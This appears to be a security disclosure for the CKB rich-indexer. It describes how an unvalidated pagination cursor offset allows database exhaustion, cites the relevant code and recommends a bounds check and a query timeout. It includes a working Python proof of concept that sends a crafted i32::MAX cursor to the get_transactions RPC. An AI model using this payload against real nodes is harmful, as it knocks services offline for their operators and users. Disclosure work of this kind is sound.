### Title
Unvalidated `i32::MAX` OFFSET in `get_tx_with_cell` Enables DB Exhaustion via Crafted Pagination Cursor — (`util/rich-indexer/src/indexer_handle/async_indexer_handle/get_transactions.rs`)

---

### Summary

An unprivileged RPC caller can craft a 12-byte `after` cursor whose last 4 bytes encode `i32::MAX` (0x7fffffff). This value is decoded without any range check and passed directly as a SQL `OFFSET`, forcing the database engine to scan and discard up to 2,147,483,647 rows before returning results. No timeout is enforced on the async rich-indexer handle. Repeated requests cause severe CPU/IO exhaustion and node unresponsiveness.

---

### Finding Description

`get_transactions` with `group_by_transaction=false` (or omitted) parses the `after` cursor at: [1](#0-0) 

The only validation is that the cursor is exactly 12 bytes. The last 4 bytes are decoded as an `i32` via `decode_i32`: [2](#0-1) 

`decode_i32` performs no range check — it accepts any value including `i32::MAX`. The decoded offset is then passed directly to the SQL query builder: [3](#0-2) 

This produces SQL of the form:

```sql
SELECT ... FROM (...) AS res
JOIN ckb_transaction ... JOIN block ...
WHERE tx_id >= 0
ORDER BY tx_id ASC
LIMIT 100 OFFSET 2147483647
```

Both SQLite and PostgreSQL implement `OFFSET` by scanning and discarding rows sequentially. The scan cost is `min(matching_rows, 2147483647)`. On a mainnet-populated DB with tens or hundreds of millions of rows, this is a full table scan per request.

The `request_limit` guard only caps the `limit` parameter: [4](#0-3) 

It does not constrain the `offset`. The `AsyncRichIndexerHandle` struct carries no `timeout_limit` field: [5](#0-4) 

The `timeout_limit` config option exists only for the non-async `IndexerHandle` in `util/indexer/src/service.rs`, not for the rich-indexer async path. The `RichIndexerService` passes only `request_limit` to `AsyncRichIndexerHandle::new`: [6](#0-5) 

---

### Impact Explanation

A single request with `OFFSET 2147483647` forces a full sequential scan of the entire matching result set in the DB. On a mainnet node with a populated rich-indexer DB, this can consume seconds to minutes of CPU and I/O per request. Multiple concurrent requests from one or more callers can saturate the DB thread pool, starve legitimate RPC calls, and render the node unresponsive. SQLite (the default embedded driver) is single-writer and particularly vulnerable to long-running read queries blocking the indexer sync loop.

---

### Likelihood Explanation

The rich-indexer RPC is unauthenticated and publicly accessible by default. The cursor format is documented and the 12-byte structure is trivially constructable. No PoW, key material, or privileged access is required. The attack is repeatable and stateless.

---

### Recommendation

Add an upper-bound check on the decoded offset immediately after `decode_i32`, rejecting cursors whose offset exceeds a reasonable maximum (e.g., `self.request_limit as i32` or a fixed constant). For example, after line 52:

```rust
if offset < 0 || offset as usize > self.request_limit {
    return Err(Error::Params("cursor offset out of range".to_string()));
}
```

Additionally, apply a per-query timeout to the async rich-indexer handle analogous to the `timeout_limit` already present in the non-async indexer path.

---

### Proof of Concept

Craft the `after` cursor as 12 bytes: 8 zero bytes (tx_id = 0) followed by `[0xff, 0xff, 0xff, 0x7f]` (offset = `i32::MAX` = 2,147,483,647 in little-endian):

```python
import json, requests

after_cursor = "0x" + "00" * 8 + "ffffff7f"

payload = {
    "jsonrpc": "2.0", "id": 1,
    "method": "get_transactions",
    "params": [
        {
            "script": {
                "code_hash": "0x9bd7e06f3ecf4be0f2fcd2188b23f1b9fcc88e5d4b65a8637b17723bbda3cce8",
                "hash_type": "type",
                "args": "0x"
            },
            "script_type": "lock",
            "group_by_transaction": False
        },
        "asc",
        "0x1",
        after_cursor
    ]
}
import time
t0 = time.time()
r = requests.post("http://localhost:8114", json=payload)
print(f"elapsed: {time.time()-t0:.2f}s, result: {r.text[:200]}")
```

Compare elapsed time against a normal cursor (e.g., `after = "0x" + "00"*12`). The crafted cursor will produce a query time proportional to the full table size, while the normal cursor returns immediately.

### Citations

**File:** util/rich-indexer/src/indexer_handle/async_indexer_handle/get_transactions.rs (L23-32)
```rust
        let limit = limit.value();
        if limit == 0 {
            return Err(Error::invalid_params("limit should be greater than 0"));
        }
        if limit as usize > self.request_limit {
            return Err(Error::invalid_params(format!(
                "limit must be less than {}",
                self.request_limit,
            )));
        }
```

**File:** util/rich-indexer/src/indexer_handle/async_indexer_handle/get_transactions.rs (L44-53)
```rust
                if let Some(after) = after {
                    if after.len() != 12 {
                        return Err(Error::Params(
                            "Unable to parse the 'after' parameter.".to_string(),
                        ));
                    }
                    let (last, offset) = after.as_bytes().split_at(after.len() - 4);
                    let last = decode_i64(last)?;
                    let offset = decode_i32(offset)?;
                    last_cursor = Some((last, offset));
```

**File:** util/rich-indexer/src/indexer_handle/async_indexer_handle/get_transactions.rs (L180-182)
```rust
    if let Some((_, offset)) = last_cursor {
        query_builder.offset(offset);
    }
```

**File:** util/rich-indexer/src/indexer_handle/async_indexer_handle/mod.rs (L23-37)
```rust
pub struct AsyncRichIndexerHandle {
    store: SQLXPool,
    pool: Option<Arc<RwLock<Pool>>>,
    request_limit: usize,
}

impl AsyncRichIndexerHandle {
    /// Construct new AsyncRichIndexerHandle instance
    pub fn new(store: SQLXPool, pool: Option<Arc<RwLock<Pool>>>, request_limit: usize) -> Self {
        Self {
            store,
            pool,
            request_limit,
        }
    }
```

**File:** util/rich-indexer/src/indexer_handle/async_indexer_handle/mod.rs (L286-294)
```rust
fn decode_i32(data: &[u8]) -> Result<i32, Error> {
    if data.len() != 4 {
        return Err(Error::Params(
            "unable to convert from bytes to i32 due to insufficient data in little-endian format"
                .to_string(),
        ));
    }
    Ok(i32::from_le_bytes(to_fixed_array(&data[0..4])))
}
```

**File:** util/rich-indexer/src/service.rs (L97-99)
```rust
    pub fn async_handle(&self) -> AsyncRichIndexerHandle {
        AsyncRichIndexerHandle::new(self.store.clone(), self.sync.pool(), self.request_limit)
    }
```
